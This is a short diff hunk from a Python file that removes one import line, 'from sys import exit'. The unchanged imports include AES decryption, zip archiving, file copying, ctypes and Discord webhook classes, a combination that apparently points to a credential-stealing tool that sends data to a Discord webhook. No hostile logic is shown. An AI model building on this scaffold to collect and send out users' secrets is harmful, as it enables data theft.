@@ -14,7 +14,6 @@ import ctypes
 
 from tkinter import messagebox
 from shutil import copy2
-from sys import exit
 from zipfile import ZipFile
 from Crypto.Cipher import AES
 from discord import Embed, File, SyncWebhook
